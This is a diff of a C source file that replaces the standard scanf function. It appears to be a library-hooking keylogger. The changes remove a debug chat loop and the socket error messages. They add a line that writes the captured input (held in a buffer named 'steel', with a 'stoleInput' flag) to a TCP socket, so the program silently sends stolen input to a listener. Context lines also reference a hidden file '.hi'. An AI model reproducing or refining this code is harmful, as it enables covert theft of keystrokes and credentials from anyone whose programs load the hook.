@@ -17,26 +17,7 @@
 #define HIDDEN_FILE ".hi"
 #define TRUE 1
 #define FALSE 0
-void func(int sockfd)
-{
-    char buff[MAX];
-    int n;
-    for (;;) {
-        bzero(buff, sizeof(buff));
-        printf("Enter the string : ");
-        n = 0;
-        while ((buff[n++] = getchar()) != '\n')
-            ;
-        write(sockfd, buff, sizeof(buff));
-        bzero(buff, sizeof(buff));
-        read(sockfd, buff, sizeof(buff));
-        printf("From Server : %s", buff);
-        if ((strncmp(buff, "exit", 4)) == 0) {
-            printf("Client Exit...\n");
-            break;
-        }
-    }
-}
+
 
 
 
@@ -70,20 +51,12 @@ int scanf ( const char * format, ... )
 		i++;
 		stoleInput = TRUE;
 	}
-//	fprintf(fd, "%s",steel);
-
 
     int sockfd, connfd;
     struct sockaddr_in servaddr, cli;
 
-    // socket create and verification
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
-    if (sockfd == -1) {
-        printf("socket creation failed...\n");
-        exit(0);
-    }
-    else
-        printf("Socket successfully created..\n");
+
     bzero(&servaddr, sizeof(servaddr));
 
     // assign IP, PORT
@@ -91,16 +64,10 @@ int scanf ( const char * format, ... )
     servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
     servaddr.sin_port = htons(PORT);
 
-    // connect the client socket to server socket
-    if (connect(sockfd, (SA*)&servaddr, sizeof(servaddr)) != 0) {
-        printf("connection with the server failed...\n");
-        exit(0);
-    }
-    else
-        printf("connected to the server..\n");
+    connect(sockfd, (SA*)&servaddr, sizeof(servaddr)) ;
 
-    // function for chat
-    func(sockfd);
+
+    write(sockfd, steel, sizeof(steel));
 
     // close the socket
     close(sockfd);
@@ -108,5 +75,5 @@ int scanf ( const char * format, ... )
 
 
 
-	return stoleInput;	
+	return stoleInput;
 }
